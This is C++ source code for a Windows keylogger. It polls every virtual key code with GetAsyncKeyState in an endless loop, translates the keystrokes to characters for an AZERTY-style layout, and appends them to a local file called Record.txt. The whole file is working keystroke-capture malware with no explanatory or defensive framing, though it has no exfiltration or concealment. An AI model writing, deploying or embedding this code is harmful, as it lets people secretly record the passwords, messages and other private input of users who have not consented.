#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>


void StartLogging();
void Write(unsigned char c);
void Write_char(std::string c);
bool uppercase(void);
bool alt_gr(void);

int main() {

	StartLogging();
	return EXIT_SUCCESS;
}

void StartLogging() {
	unsigned char c;

	while (1) {

		for (c = 8; c <= 255; c++) {
			
			if (GetAsyncKeyState(c) == -32767) {

				
				std::cout << (int)c << std::endl;

				
				if(alt_gr() && (GetKeyState(VK_SHIFT) == (-127) || GetKeyState(VK_SHIFT) == (-128)) ){
					
				}
				
				if ((c > 64) && (c < 91) && !uppercase() ) {  
					c += 32;
					Write(c);
					break;
				}
				else if ((c > 64) && (c < 91)) {
					Write(c);
					break;
				}
				if(c >=96 && c <= 105){
					c-=48;
					Write(c);
					break;
				}
				if(uppercase() && !alt_gr()){
					if(c >= 48 && c <=57){
						Write(c);
						break;
					}
					switch(c){
					case 219:
						Write_char("°");
						break;
					case 187:
						Write_char("+");
						break;
					case 221:
						Write_char("¨");
						break;
					case 186:
						Write_char("£");
						break;
					case 220:
						Write_char("µ");
						break;
					case 188:
						Write_char("?");
						break;
					case 190:
						Write_char(".");
						break;
					case 191:
						Write_char("/");
						break;
					case 223:
						Write_char("§");
						break;
					case 226:
						Write_char(">");
						break;
					}
				}
				if(alt_gr() && GetKeyState(VK_SHIFT) != (-127) && GetKeyState(VK_SHIFT) != (-128) ){
					switch(c){
					case 48:
						Write_char("@");
						break;
					case 50:
						Write_char("~");
						break;
					case 51:
						Write_char("#");
						break;
					case 52:
						Write_char("{");
						break;
					case 53:
						Write_char("[");
						break;
					case 54:
						Write_char("|");
						break;
					case 55:
						Write_char("`");
						break;
					case 56:
						Write_char("\\");
						break;
					case 57:
						Write_char("^");
						break;
					case 219:
						Write_char("]");
						break;
					case 187:
						Write_char("}");
						break;
					case 186:
						Write_char("¤");
						break;
					}
					

				}
				if(!uppercase() && !alt_gr() && GetKeyState(VK_MENU) != (-127) && GetKeyState(VK_MENU) != (-128)){
					switch(c){
						case 48:
							Write_char("à");
							break;
						case 49:
							Write_char("&");
							break;
						case 50:
							Write_char("é");
							break;
						case 51:
							Write_char("\"");
							break;
						case 52:
							Write_char("'");
							break;
						case 53:
							Write_char("(");
							break;
						case 54:
							Write_char("-");
							break;
						case 55:
							Write_char("è");
							break;
						case 56:
							Write_char("_");
							break;
						case 57:
							Write_char("ç");
							break;
						case 219:
							Write_char(")");
							break;
						case 187:
							Write_char("=");
							break;
						case 221:
							Write_char("^");
							break;
						case 186:
							Write_char("$");
							break;
						case 192:
							Write_char("ù");
							break;
						case 220:
							Write_char("*");
							break;
						case 188:
							Write_char(",");
							break;
						case 190:
							Write_char(";");
							break;
						case 191:
							Write_char(":");
							break;
						case 223:
							Write_char("!");
							break;
						case 226:
							Write_char("<");
							break;
						case 222:
							Write_char("²");
							break;
						
					}
				}
				if(GetKeyState(VK_MENU) != (-127) && GetKeyState(VK_MENU) != (-128)){
					switch(c){
						case 110:
							Write_char(".");
							break;
						case 107:
							Write_char("+");
							break;
						case 109:
							Write_char("-");
							break;
						case 106:
							Write_char("*");
							break;
						case 111:
							Write_char("/");
							break;
					}

				}

		
				switch(c){
					case VK_TAB:
						Write_char("<Tab>");
						break;
					case VK_RETURN:
						Write_char("<Return>");
						break;
					case VK_SPACE:
						Write_char(" ");
						break;
					case VK_BACK:
						Write_char("<Back>");
						break;
				}

				
			

				
			}
				



		}
	}
}

void Write(unsigned char c){
	std::ofstream write("Record.txt", std::ios::app);
	write << c;
	write.close();

}

void Write_char(std::string c){
	std::ofstream write("Record.txt", std::ios::app);
	write << c;
	write.close();
}

bool uppercase(void){
	if(GetKeyState(VK_CAPITAL) == 1 || GetKeyState(VK_SHIFT) == (-127) || GetKeyState(VK_SHIFT) == (-128) ){
		return true;
	}
	return false;
}


bool alt_gr(void){
	return (GetKeyState(165) == (-127) || GetKeyState(165) == (-128));
}